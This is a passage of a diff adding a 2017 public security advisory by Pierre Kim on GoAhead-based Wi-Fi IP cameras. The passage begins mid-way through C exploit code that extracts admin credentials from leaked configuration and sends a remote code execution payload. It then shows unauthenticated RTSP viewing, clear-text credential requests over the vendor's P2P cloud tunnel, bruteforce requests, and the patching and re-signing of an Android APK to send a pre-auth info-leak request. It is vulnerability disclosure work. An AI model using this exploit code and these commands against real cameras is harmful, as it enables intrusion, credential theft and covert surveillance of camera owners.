+<span style="color: #408080; font-style: italic">  00006c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span>
+<span style="color: #408080; font-style: italic">  ...</span>
+
+<span style="color: #408080; font-style: italic">  NOTE: reference can be too:</span>
+<span style="color: #408080; font-style: italic">  000????: 0006 0606 0606 0100 000a .... .... ....</span>
+
+<span style="color: #408080; font-style: italic">  Other method: parse everything, find the &quot;admin&quot; string and extract the associated password</span>
+<span style="color: #408080; font-style: italic">  by adding 31bytes after the address of &#39;a&#39;[dmin].</span>
+<span style="color: #408080; font-style: italic">  Works if the login is admin (seems to be this by default, but can be changed by the user)</span>
+<span style="color: #408080; font-style: italic">  */</span>
+
+  <span style="color: #008000; font-weight: bold">if</span> (get_config)
+  {
+    <span style="color: #008000; font-weight: bold">for</span> (<span style="color: #B00040">unsigned</span> <span style="color: #B00040">int</span> j <span style="color: #666666">=</span> <span style="color: #666666">0</span>; j <span style="color: #666666">&lt;</span> n_total <span style="color: #666666">&amp;&amp;</span> j <span style="color: #666666">&lt;</span> <span style="color: #666666">10</span> <span style="color: #666666">*</span> <span style="color: #666666">1024</span>; j<span style="color: #666666">++</span>)
+      printf(<span style="color: #BA2121">&quot;%c&quot;</span>, tmp[j]);
+    exit (<span style="color: #666666">0</span>);
+  }
+
+
+  <span style="color: #008000; font-weight: bold">for</span> (<span style="color: #B00040">unsigned</span> <span style="color: #B00040">int</span> j <span style="color: #666666">=</span> <span style="color: #666666">50</span>; j <span style="color: #666666">&lt;</span> <span style="color: #666666">10</span> <span style="color: #666666">*</span> <span style="color: #666666">1024</span>; j<span style="color: #666666">++</span>)
+  {
+     <span style="color: #008000; font-weight: bold">if</span> (tmp[j <span style="color: #666666">-</span> <span style="color: #666666">4</span>] <span style="color: #666666">==</span> <span style="color: #666666">0x0a</span> <span style="color: #666666">&amp;&amp;</span>
+         tmp[j <span style="color: #666666">-</span> <span style="color: #666666">3</span>] <span style="color: #666666">==</span> <span style="color: #666666">0x0a</span> <span style="color: #666666">&amp;&amp;</span>
+         tmp[j <span style="color: #666666">-</span> <span style="color: #666666">2</span>] <span style="color: #666666">==</span> <span style="color: #666666">0x0a</span> <span style="color: #666666">&amp;&amp;</span>
+         tmp[j <span style="color: #666666">-</span> <span style="color: #666666">1</span>] <span style="color: #666666">==</span> <span style="color: #666666">0x0a</span> <span style="color: #666666">&amp;&amp;</span>
+         tmp[j]     <span style="color: #666666">==</span> <span style="color: #666666">0x01</span>)
+     {
+       <span style="color: #008000; font-weight: bold">if</span> (j <span style="color: #666666">+</span> <span style="color: #666666">170</span> <span style="color: #666666">&lt;</span> <span style="color: #666666">10</span> <span style="color: #666666">*</span> <span style="color: #666666">1024</span>)
+       {
+         strcat(out, <span style="color: #666666">&amp;</span>tmp[j <span style="color: #666666">+</span> <span style="color: #666666">138</span>]);
+         strcat(out <span style="color: #666666">+</span> <span style="color: #666666">32</span> <span style="color: #666666">*</span> <span style="color: #008000; font-weight: bold">sizeof</span>(<span style="color: #B00040">char</span>), <span style="color: #666666">&amp;</span>tmp[j <span style="color: #666666">+</span> <span style="color: #666666">170</span>]);
+         free(tmp);
+
+         <span style="color: #008000; font-weight: bold">return</span> (out);
+       }
+     }
+  }
+
+  free(tmp);
+
+  <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #008000">NULL</span>);
+}
+
+<span style="color: #B00040">int</span>       <span style="color: #0000FF">rce</span>(<span style="color: #B00040">char</span>    <span style="color: #666666">*</span>argv,
+              <span style="color: #B00040">char</span>    <span style="color: #666666">*</span>id,
+              <span style="color: #B00040">char</span>    attack[],
+              <span style="color: #B00040">char</span>    desc[])
+{
+  <span style="color: #B00040">int</span>                 sock;
+  <span style="color: #008000; font-weight: bold">struct</span> sockaddr_in  serv_addr;
+  <span style="color: #B00040">char</span>                <span style="color: #666666">*</span>payload;
+
+  <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span>(payload <span style="color: #666666">=</span> calloc(<span style="color: #666666">512</span>, <span style="color: #008000; font-weight: bold">sizeof</span>(<span style="color: #B00040">char</span>))))
+    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">1</span>);
+
+  sock <span style="color: #666666">=</span> <span style="color: #666666">0</span>;
+
+  printf(<span style="color: #BA2121">&quot;[+] %s payload ... &quot;</span>, desc);
+
+  <span style="color: #008000; font-weight: bold">if</span> ((sock <span style="color: #666666">=</span> socket(AF_INET, SOCK_STREAM, <span style="color: #666666">0</span>)) <span style="color: #666666">&lt;</span> <span style="color: #666666">0</span>)
+  {
+    printf(<span style="color: #BA2121">&quot;Error while creating socket</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
+    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">1</span>);
+  }
+
+  memset(<span style="color: #666666">&amp;</span>serv_addr, <span style="color: #BA2121">&#39;0&#39;</span>, <span style="color: #008000; font-weight: bold">sizeof</span>(serv_addr));
+  serv_addr.sin_family <span style="color: #666666">=</span> AF_INET;
+  serv_addr.sin_port <span style="color: #666666">=</span> htons(CAM_PORT);
+
+  <span style="color: #008000; font-weight: bold">if</span> (inet_pton(AF_INET, argv, <span style="color: #666666">&amp;</span>serv_addr.sin_addr) <span style="color: #666666">&lt;=</span> <span style="color: #666666">0</span>)
+  {
+    printf(<span style="color: #BA2121">&quot;Error while inet_pton</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
+    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">1</span>);
+  }
+
+  <span style="color: #008000; font-weight: bold">if</span> (connect(sock, (<span style="color: #008000; font-weight: bold">struct</span> sockaddr <span style="color: #666666">*</span>)<span style="color: #666666">&amp;</span>serv_addr , <span style="color: #008000; font-weight: bold">sizeof</span>(serv_addr)) <span style="color: #666666">&lt;</span> <span style="color: #666666">0</span>)
+  {
+    printf(<span style="color: #BA2121">&quot;rce: connect failed</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
+    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">1</span>);
+  }
+
+
+  sprintf(payload, attack, id, id <span style="color: #666666">+</span> <span style="color: #666666">32</span>);
+  <span style="color: #008000; font-weight: bold">if</span> (send(sock, payload, strlen(payload) , <span style="color: #666666">0</span>) <span style="color: #666666">&lt;</span> <span style="color: #666666">0</span>)
+  {
+    printf(<span style="color: #BA2121">&quot;rce: send failed</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
+    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">1</span>);
+  }
+
+  <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">0</span>);
+}
+</pre></div>
+
+<p>Alternatively, you can fetch it at <a href="https://pierrekim.github.io/advisories/expl-goahead-camera.c">https://pierrekim.github.io/advisories/expl-goahead-camera.c</a>.</p>
+<p><a id="open-streaming"></a></p>
+<h2>Details -- Misc - Streaming without authentication</h2>
+<p>An attacker can use the authenticated-less RTSP server running on the camera on port <code>10554/tcp</code> to watch the streaming without authentication.</p>
+<pre><code>user@kali$ vlc rstp://192.168.1.107:10554/tcp/av0_1
+</code></pre>
+<p>And:</p>
+<pre><code>user@kali$ vlc rstp://192.168.1.107:10554/tcp/av0_0
+</code></pre>
+<p><a id="cloud"></a></p>
+<h2>Details -- Misc - "Cloud" (Aka Botnet)</h2>
+<p>By default, the camera uses a 'Cloud' functionality.</p>
+<p>You can tcpdump the traffic of the camera, which is very scary:</p>
+<pre><code>12:09:21.410947 IP 192.168.1.107.46958 &gt; 8.8.8.8.53: 60806+ A? openapi.xg.qq.com.gateway. (43)
+12:09:26.429697 IP 192.168.1.107.58156 &gt; 202.96.134.33.53: 60806+ A? openapi.xg.qq.com.gateway. (43)
+12:09:31.450033 IP 192.168.1.107.41499 &gt; 8.8.8.8.53: 28561+ A? www.baidu.com. (31)
+12:09:35.128919 IP 192.168.1.107.13179 &gt; 121.42.208.86.32100: UDP, length 48
+12:09:35.128932 IP 192.168.1.107.13179 &gt; 54.221.213.97.32100: UDP, length 48
+12:09:35.128933 IP 192.168.1.107.13179 &gt; 120.24.37.48.32100: UDP, length 48
+12:09:36.468849 IP 192.168.1.107.44185 &gt; 202.96.134.33.53: 28561+ A? www.baidu.com. (31)
+12:09:41.488223 IP 192.168.1.107.41499 &gt; 8.8.8.8.53: 28561+ A? www.baidu.com. (31)
+12:09:46.507810 IP 192.168.1.107.44185 &gt; 202.96.134.33.53: 28561+ A? www.baidu.com. (31)
+12:09:51.527501 IP 192.168.1.107.47793 &gt; 8.8.8.8.53: 33930+ A? www.baidu.com.gateway. (39)
+12:09:56.546854 IP 192.168.1.107.53618 &gt; 202.96.134.33.53: 33930+ A? www.baidu.com.gateway. (39)
+12:10:01.566316 IP 192.168.1.107.47793 &gt; 8.8.8.8.53: 33930+ A? www.baidu.com.gateway. (39)
+12:10:06.575735 ARP, Request who-has 192.168.1.1 tell 192.168.1.107, length 46
+12:10:06.575750 ARP, Reply 192.168.1.1 is-at 00:e0:4c:51:55:ed, length 28
+12:10:06.585841 IP 192.168.1.107.53618 &gt; 202.96.134.33.53: 33930+ A? www.baidu.com.gateway. (39)
+12:10:11.606030 IP 192.168.1.107.46252 &gt; 8.8.8.8.53: 41046+ A? time.nist.gov. (31)
+12:10:16.625044 IP 192.168.1.107.44109 &gt; 202.96.134.33.53: 41046+ A? time.nist.gov. (31)
+12:10:19.214687 IP 192.168.1.107.13179 &gt; 121.42.208.86.32100: UDP, length 48
+12:10:19.214700 IP 192.168.1.107.13179 &gt; 54.221.213.97.32100: UDP, length 48
+12:10:19.214702 IP 192.168.1.107.13179 &gt; 120.24.37.48.32100: UDP, length 48
+12:10:21.644397 IP 192.168.1.107.46252 &gt; 8.8.8.8.53: 41046+ A? time.nist.gov. (31)
+</code></pre>
+<p>The camera tries to resolve <code>www.baidu.com</code>, <code>openapi.xg.qq.com</code>, contacts hardcoded IPs and hosts:</p>
+<ul>
+<li><code>121.42.208.86:32100/udp</code> (CN: Alibaba),</li>
+<li><code>54.221.213.97:32100/udp</code> (AWS US),</li>
+<li><code>120.24.37.48:32100/udp</code> (CN: Alibaba),</li>
+<li><code>www.baidu.com:80/tcp</code> (CN: Baidu).</li>
+</ul>
+<p>It appears this is the 'Cloud' functionality, enabled by default. The security of this functionality is not proven.</p>
+<p>The provided Android application to manage my camera is <a href="https://play.google.com/store/apps/details?id=object.p2pwificam.client">object.p2pwificam.client.apk</a>.</p>
+<p><img src="images/2017-cam-p2pwificam-0.png">
+<img src="images/2017-cam-p2pwificam-1.png"></p>
+<p>Netcam 360 works too:</p>
+<p><img src="images/2017-cam-netcam.png"></p>
+<p>It appears, the network protocol is very weak:</p>
+<ol>
+<li>the camera contacts a remote server using UDP,</li>
+<li>the application contacts a remote server using UDP,</li>
+<li>the application sends a request to the remote server, asking if the camera with the specific serial-number is online,</li>
+<li>the server will reply by "camera doesn't exit", "camera is offline" or "camera is online",</li>
+<li>if the camera is online, a UDP tunnel is automaticaly established between the application and the camera, using the Cloud server as a relay.</li>
+</ol>
+<h3>UDP tunnel:</h3>
+<pre><code>[Android Application] &lt;===UDP===&gt; Cloud server &lt;===UDP===&gt; [Camera]
+</code></pre>
+<p>Then, the UDP tunnel is used by the application to reach the camera:</p>
+<p>1/ the client will send a HTTP request to the camera with the credentials (still in clear-text)</p>
+<pre><code>GET check_user.cgi?&amp;loginuse=admin&amp;loginpas=admin&amp;user=admin&amp;pwd=admin&amp;
+</code></pre>
+<p>or </p>
+<pre><code>GET /check_user.cgi?&amp;loginuse=admin&amp;loginpas=admin&amp;user=admin&amp;pwd=admin&amp;
+</code></pre>
+<p>2/ the camera will reply by using HTTP over UDP whenever the credentials are valid or invalid.</p>
+<p>If the credentials are valid, the camera will reply:</p>
+<pre><code>result= 0;
+</code></pre>
+<p>If the credentials are not valid, the camera will reply:</p>
+<pre><code>result=-1
+</code></pre>
+<p>3/ if the credentials are valid, then the application will send HTTP requests to .cgi files hosted by the camera by appending credentials to the requests (<code>?loginuse=valid_user&amp;loginpas=valid_pass</code>)</p>
+<h3>Step 2 in detail:</h3>
+<p>If the authentication is OK, so it is alright to dump all the configuration in cleartext!</p>
+<p><img alt="" src="images/2017-cam-cloud-auth-ok.png" /></p>
+<p>Note: this trace was done with one of the application listed below, to be sure applications are sharing the same "cloud" network  (it appears the daemon running on the camera doesn't strictly respect the HTTP protocol - note the lack of <code>/</code> - but it works !).</p>
+<p>If the authentication is not OK. The cameras answers:</p>
+<pre><code>result=-1;
+</code></pre>
+<p>Due to the absence of checking, an attacker can simply bruteforce credentials.</p>
+<p><img alt="" src="images/2017-cam-cloud-auth-fail.png" /></p>
+<h3>Step 3 in detail:</h3>
+<p>The application sends:</p>
+<pre><code>GET get_params.cgi?&amp;loginuse=admin&amp;loginpas=admin&amp;user=admin&amp;pwd=admin&amp;
+</code></pre>
+<p>OR</p>
+<pre><code>GET /get_params.cgi?&amp;loginuse=admin&amp;loginpas=admin&amp;user=admin&amp;pwd=admin&amp;
+</code></pre>
+<p>The camera replies by sending all its configuration in clear-text:</p>
+<pre><code>var now=1122211111;
+var dst_enable=0;
+var dst_time=0;
+var tz=0;
+var ntp_enable=1;
+var ntp_svr="time.nist.gov";
+var dhcpen=1;
+var ip="192.168.2.76";
+var mask="255.255.255.0";
+var gateway="192.168.2.1";
+var dns1="8.8.8.8";
+var dns2="192.168.2.1";
+var port=80;
+var nashost="";
+var nasport=0;
+var dev2_host="";
+var dev2_alias="";
+var dev2_user="";
+var dev2_pwd="";
+var dev2_port=0;
+var dev3_host="";
+var dev3_alias="";
+var dev3_user="";
+var dev3_pwd="";
+var dev3_port=0;
+var dev4_host="";
+var dev4_alias="";
+var dev4_user="";
+var dev4_pwd="";
+var dev4_port=0;
+var dev5_host="";
+var dev5_alias="";
+var dev5_user="";
+var dev5_pwd="";
+var dev5_port=0;
+var dev6_host="";
+var dev6_alias
+[...]
+var user1_name="";
+var user1_pwd="";
+var user2_name="wut";
+var user2_pwd="wut";
+var user3_name="admin";
+var user3_pwd="admin";
+[...]
+</code></pre>
+<p>This is interesting because an attacker can reach a camera only by knowing a serial number. The UDP tunnel between the attacker and the camera is established even if the attacker doesn't know the credentials. It's useful to note the tunnel bypasses NAT and firewall, allowing the attacker to reach internal cameras (if they are connected to the Internet) and to bruteforce credentials.
+Then, the attacker can just try to bruteforce credentials of the camera:</p>
+<pre><code>GET /get_params.cgi?&amp;loginuse=admin&amp;loginpas=TEST&amp;user=admin&amp;pwd=TEST&amp;
+</code></pre>
+<p>This protocol appears to be common to a lot of Android applications, ie:</p>
+<ul>
+<li><a href="https://play.google.com/store/apps/details?id=object.p2pwificam.client">object.p2pwificam.client</a>  (500.000 - 1.000.000 installations)</li>
+<li><a href="https://play.google.com/store/apps/details?id=hsl.p2pipcam">hsl.p2pipcam</a> (100.000 - 500.000 installations)</li>
+<li><a href="https://play.google.com/store/apps/details?id=object.liouzx.client">object.liouzx.client</a>  (100.000 - 500.000 installations)</li>
+<li><a href="https://play.google.com/store/apps/details?id=object.lioupp.client">object.lioupp.client</a> (100.000 - 500.000 installations)</li>
+<li><a href="https://play.google.com/store/apps/details?id=com.g_zhang.myp2pcam">com.g_zhang.myp2pcam</a> (100.000 - 500.000 installations)</li>
+<li><a href="https://play.google.com/store/apps/details?id=object.aisaidezx.client">object.aisaidezx.client</a> (50.000 - 100.000 installations)</li>
+<li><a href="https://play.google.com/store/apps/details?id=hsl.cam360">hsl.cam360</a>  (10.000 - 50.000 installations)</li>
+<li><a href="https://play.google.com/store/apps/details?id=bravocam.p2pipcam">bravocam.p2pipcam</a> (10.000 - 50.000 installations)</li>
+<li><a href="https://play.google.com/store/apps/details?id=xcam.p2pipcam">xcam.p2pipcam</a> (10.000 - 50.000 installations)</li>
+<li><a href="https://play.google.com/store/apps/details?id=snugcam.p2pipcam">snugcam.p2pipcam</a> (10.000 - 50.000 installations)</li>
+<li><a href="https://play.google.com/store/apps/details?id=myview.p2pipcam">myview.p2pipcam</a> (5.000 - 10.000 installations) </li>
+<li><a href="https://play.google.com/store/apps/details?id=object.weimaisizx.client">object.weimaisizx.client</a> (10.000 - 50.000 installations)</li>
+<li><a href="https://play.google.com/store/apps/details?id=com.tutk.P2PCamLive.Pixord">com.tutk.P2PCamLive.Pixord</a> (10.000 - 50.000 installations)</li>
+<li><a href="https://play.google.com/store/apps/details?id=object.p2pnetwork.client">object.p2pnetwork.client</a> (5.000 - 10.000 installations)</li>
+</ul>
+<p>This list is very far from being complete.</p>
+<p>So, I modified the original Android Application in order to try the pre-auth Info-Leak vulnerability:</p>
+<pre><code>k% ls -la
+total 14912
+drwx------ 2 nobody nogroup     100 Mar  7 08:27 .
+drwxrwxrwt 3 root   root        140 Mar  7 08:25 ..
+-rwx------ 1 nobody nogroup    2319 Mar  7 08:25 apktool
+-rwx------ 1 nobody nogroup 8488199 Mar  7 08:25 apktool.jar
+-rwx------ 1 nobody nogroup 6773051 Mar  7 08:25 object.p2pwificam.client.apk
+k% ./apktool d object.p2pwificam.client.apk
+I: Using Apktool 2.2.2 on object.p2pwificam.client.apk
+I: Loading resource table...
+I: Decoding AndroidManifest.xml with resources...
+S: WARNING: Could not write to $HOME (/nonexistent), using /tmp instead...
+S: Please be aware this is a volatile directory and frameworks could go missing, please utilize --frame-path if the default storage directory is unavailable
+I: Loading resource table from file: /tmp/.local/share/apktool/framework/1.apk
+I: Regular manifest package...
+I: Decoding file-resources...
+I: Decoding values */* XMLs...
+I: Baksmaling classes.dex...
+I: Copying assets and libs...
+I: Copying unknown files...
+I: Copying original files...
+k%
+</code></pre>
+<p>I edit the library which manages all the custom HTTP requests.</p>
+<p>One of the interesting string is <code>GET /%sloginuse=%s&amp;loginpas=%s&amp;user=%s&amp;pwd=%s</code>:</p>
+<pre><code>k% xxd ./object.p2pwificam.client/lib/armeabi/libobject_jni.so
+
+0001f650: 3d3d 3d3d 3d3d 3d3d 0000 0000 4745 5420  ========....GET 
+0001f660: 2f25 736c 6f67 696e 7573 653d 2573 266c  /%sloginuse=%s&amp;l
+0001f670: 6f67 696e 7061 733d 2573 2675 7365 723d  oginpas=%s&amp;user=
+0001f680: 2573 2670 7764 3d25 7326 0000 4449 443a  %s&amp;pwd=%s&amp;..DID:
+0001f690: 2025 732c 2063 6769 5f67 6574 5f63 6f6d   %s, cgi_get_com
+0001f6a0: 6d6f 6e3a 2025 7300 5050 5050 5f43 6f6e  mon: %s.PPPP_Con
+0001f6b0: 6e65 6374 2062 6567 696e 2e2e 2e25 7300  nect begin...%s.
+0001f6c0: 5050 5050 5f43 6f6e 6e65 6374 2066 6169  PPPP_Connect fai
+0001f6d0: 6c65 642e 2e20 2573 2072 6574 7572 6e3a  led.. %s return:
+0001f6e0: 2025 6400 5265 436f 6e6e 6563 7443 6f75   %d.ReConnectCou
+0001f6f0: 6e74 3a20 2564 0a00 5050 5050 5f43 6f6e  nt: %d..PPPP_Con
+0001f700: 6e65 6374 2073 7563 6365 7373 2e2e 2e6d  nect success...m
+0001f710: 5f68 5365 7373 696f 6e48 616e 646c 653a  _hSessionHandle:
+</code></pre>
+<p>After the modification:</p>
+<pre><code>0001f650: 3d3d 3d3d 3d3d 3d3d 0000 0000 4745 5420  ========....GET 
+0001f660: 2f73 7973 7465 6d2e 696e 693f 6c6f 6769  /system.ini?logi
+0001f670: 6e75 7365 266c 6f67 696e 7061 7373 2678  nuse&amp;loginpass&amp;x
+0001f680: 7878 7878 7878 7878 7826 0000 4449 443a  xxxxxxxxx&amp;..DID:
+0001f690: 2025 732c 2063 6769 5f67 6574 5f63 6f6d   %s, cgi_get_com
+0001f6a0: 6d6f 6e3a 2025 7300 5050 5050 5f43 6f6e  mon: %s.PPPP_Con
+0001f6b0: 6e65 6374 2062 6567 696e 2e2e 2e25 7300  nect begin...%s.
+0001f6c0: 5050 5050 5f43 6f6e 6e65 6374 2066 6169  PPPP_Connect fai
+</code></pre>
+<p>Then, let's repack and sign the .apk:</p>
+<pre><code>k% ./apktool b object.p2pwificam.client
+I: Using Apktool 2.2.2
+I: Checking whether sources has changed...
+I: Checking whether resources has changed...
+I: Building resources...
+S: WARNING: Could not write to $HOME (/nonexistent), using /tmp instead...
+S: Please be aware this is a volatile directory and frameworks could go missing, please utilize --frame-path if the default storage directory is unavailable
+W: warning: string 'conectar' has no default translation.
+W: warning: string 'str_ipcamfour' has no default translation.
+W: warning: string 'user_pwd_no_show' has no default translation.
+I: Copying libs... (/lib)
+I: Building apk file...
+I: Copying unknown files/dir...
+k% openssl genrsa -out key.pem
+
+Generating RSA private key, 2048 bit long modulus
+..........................................+++
+...................................................................+++
+unable to write 'random state'
+e is 65537 (0x010001)
+k% openssl req -new -key key.pem -out request.pem
+[...]
+k% openssl x509 -req -days 9999 -in request.pem -signkey key.pem -out certificate.pem
+Signature ok
+subject=C = AU, ST = Some-State, O = Internet Widgits Pty Ltd
+Getting Private key
+unable to write 'random state'
+k% openssl pkcs8 -topk8 -outform DER -in key.pem -inform PEM -out key.pk8 -nocrypt
+k% signapk certificate.pem key.pk8 object.p2pwificam.client/dist/object.p2pwificam.client.apk signed-object.p2pwificam.client.apk
+k% ls  -latr
+total 21560
+drwxrwxrwt 3 root   root        140 Mar  7 08:25 ..
+-rwx------ 1 nobody nogroup 8488199 Mar  7 08:25 apktool.jar
+-rwx------ 1 nobody nogroup    2319 Mar  7 08:25 apktool
+-rwx------ 1 nobody nogroup 6773051 Mar  7 08:25 object.p2pwificam.client.apk
+drwx------ 9 nobody nogroup     220 Mar  7 08:33 object.p2pwificam.client
+-rw------- 1 nobody nogroup    1675 Mar  7 08:33 key.pem
+-rw------- 1 nobody nogroup     956 Mar  7 08:33 request.pem
+-rw------- 1 nobody nogroup    1111 Mar  7 08:33 certificate.pem
+-rw------- 1 nobody nogroup    1217 Mar  7 08:33 key.pk8
+drwx------ 3 nobody nogroup     220 Mar  7 08:34 .
+-rw------- 1 nobody nogroup 6787146 Mar  7 08:34 signed-object.p2pwificam.client.apk
+</code></pre>
+<p><code>signed-object.p2pwificam.client.apk</code> is ready to be used.</p>
+<p>When using it, we see that:</p>
+<p>The client indeed sends the <code>system.ini</code> request within the UDP tunnel:</p>
+<p><img alt="" src="images/2017-cam-system-android.png" /></p>
+<p><br><br><br><br>
+The camera indeed receives this request within the UDP tunnel:</p>
+<p><img alt="" src="images/2017-cam-system-camera.png" /></p>
+<p><br><br><br><br>
+Complete trace is:</p>
+<p><img alt="" src="images/2017-cam-system-yolo.png" /></p>
+<p>It appears the pre-auth is not easily reachable within the cloud network.</p>
+<p>This "cloud" protocol seems to be more a botnet protocol than a legit remote access protocol and has indeed weakness (everything in clear-text, i.e. an attacker can attack cameras within the cloud and leverage potential access to hack internal networks).</p>
+<p>A lot of P2P ('Cloud') cameras are in fact using the same botnet protocols and the same infrastructure seemingly to be managed by a single entity.</p>
+<p>Writing a PoC which bruteforces credentials of the remote camera is left as an exercise for the reader.</p>
+<h2>Vendor Response</h2>
+<p>Due to difficulties in finding and contacting all the vendors, full-disclosure is applied.</p>
+<p><strong>I advise to IMMEDIATELY DISCONNECT cameras to the Internet. Hundreds of thousands cameras are affected by the 0day Info-Leak. Millions of them are using the insecure Cloud network.</strong></p>
+<h2>Report Timeline</h2>
+<ul>
+<li>Feb 26, 2017: Vulnerabilities found by Pierre Kim.</li>
+<li>Mar 08, 2017: A public advisory is sent to security mailing lists.</li>
+<li>Mar 08, 2017: Following exchanges with Embedthis Software, it appears <strong>the vulnerabilities are not located inside GoAhead but from custom and proprietary development by the Chinese OEM vendor</strong>.</li>
+<li>Mar 08, 2017: The advisory is updated.</li>
+</ul>
+<h2>Credits</h2>
+<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
+<h2>References</h2>
+<p><a href="https://pierrekim.github.io/advisories/2017-goahead-camera-0x00.txt">https://pierrekim.github.io/advisories/2017-goahead-camera-0x00.txt</a></p>
+<p><a href="https://pierrekim.github.io/blog/2017-03-06-camera-goahead-0day.html">https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html</a></p>
+<h2>Disclaimer</h2>
+<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
+Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p>
+    <div>
+        <p class="text-muted">published on 2017-03-08 00:00:00 by Pierre Kim &lt;pierre.kim.sec@gmail.com&gt;</p>
+    </div>
+</div>
+
+</div>
+</body>
+</html>
